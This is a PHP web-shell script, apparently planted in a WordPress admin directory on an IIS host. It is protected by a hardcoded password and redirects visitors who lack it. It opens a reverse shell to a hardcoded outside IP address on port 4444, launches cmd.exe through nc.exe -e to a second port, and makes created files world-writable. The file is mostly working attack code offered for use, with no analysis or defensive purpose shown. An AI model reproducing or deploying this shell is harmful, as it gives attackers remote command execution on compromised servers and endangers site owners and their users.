<?php
# Used this for IIS server with some restrictions on php functions
# Worked well with Hostworks

if($_GET['pass'] != 'the-greatest-passw0rd-eva'){
	header('Location: http://npnew.hostworks.net'); #require password to finish script
}

set_time_limit (0); #make sure full script exectues
$ip = '104.237.152.148'; #for connect back
$port = '4444';
$chunk_size=1400;
$write_a = null;
$error_a = null;
$shell = 'cmd.exe /c Webdocs\\NarrPressAdmin\\narrativepress.com\\wwwroot\\wp-admin\\user\\nc.exe -e cmd.exe 104.237.152.148 4445'; #program to execute after connection

chdir("/"); #go to root of server
umask(0); #cause all files created to be world writeable

$sock = fsockopen($ip,$port,$errno,$errstr,30); #create socket object
$descriptorspec = array(
   0 => array("pipe", "r"), #stdin file descriptor
   1 => array("pipe", "w"), #stdout file descriptor
   2 => array("pipe", "w")  #stderr file descriptor
);
$process = proc_open($shell, $descriptorspec, $pipes); #run command, pipes = taken care of by php, dont have to worry about how these are handled

stream_set_blocking($pipes[0], 0); #set non-blocking on pipes (so we can wait for them to be available)
stream_set_blocking($pipes[1], 0); #set non-blocking on pipes
stream_set_blocking($pipes[2], 0); #set non-blocking on pipes
stream_set_blocking($sock, 0); #set non-blocking on socket

for( $i = 0; $i < 1; $i++) { #run only once, so we dont cause infinite loop
	while($i < 1) {
		$read_a = array($sock, $pipes[1], $pipes[2]); #read_a will contain stdout and stderr
		$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null); #stream_select waits for arrays to change status, 1st is read array, 2nd is write array, 3rd is except array. (stdin, stdout, stderr respectively)

		if (in_array($sock, $read_a)) {
			$input = fread($sock, $chunk_size); #if this is from stdin
			fwrite($pipes[0], $input); #send to stdin
		}
		if (in_array($pipes[1], $read_a)) {
			$input = fread($pipes[1], $chunk_size); #if from stdout
			fwrite($sock, $input); #send to stdout (aka me)
		}
		if (in_array($pipes[2], $read_a)) {
			$input = fread($pipes[2], $chunk_size); #if from stderr
			fwrite($sock, $input); #send to stdout (aka me)
		}
		$i = $i +1; # make i = 1 to end loop
	}
}

fclose($sock); #clean up
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

?>
